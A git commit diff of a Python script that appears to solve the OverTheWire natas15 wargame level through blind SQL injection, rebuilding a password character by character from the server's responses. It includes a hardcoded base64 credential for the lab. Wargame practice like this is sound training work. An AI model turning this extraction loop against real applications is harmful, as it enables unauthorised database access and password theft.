4be8bb6ed68f0005741c5e82eaa9e2c9b008ffeb
Keegan Volk <145498356+keeganvolk@users.noreply.github.com>
2025-09-16 12:27:58 -0500

    Update 1.py

--- 1.py
+++ 1.py
@@ -4,7 +4,6 @@ chars='qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM1234567890' #List of 
 auth=HTTPBasicAuth('natas15','') #Credentials to access the page/send the request, add the password for natas15 in the second parameter
 pw='' #String to store the found correct password characters
 c=0 #Number of correct password characters found
-print()
 while c<32:
 	for i in chars:
 		val= 'natas16" and password LIKE BINARY "'+pw+i+'%"; #' #SQL payload
@@ -12,5 +11,6 @@ while c<32:
 		req=requests.post('http://natas15.natas.labs.overthewire.org/index.php',data=dat,auth=auth,headers={"Authorization":"Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg=="})
 		if "This user exists" in str(req.content):
 			pw=pw+i
-			print(pw + i)
-			c++
+			print(pw)
+			c+=1
+print(pw)
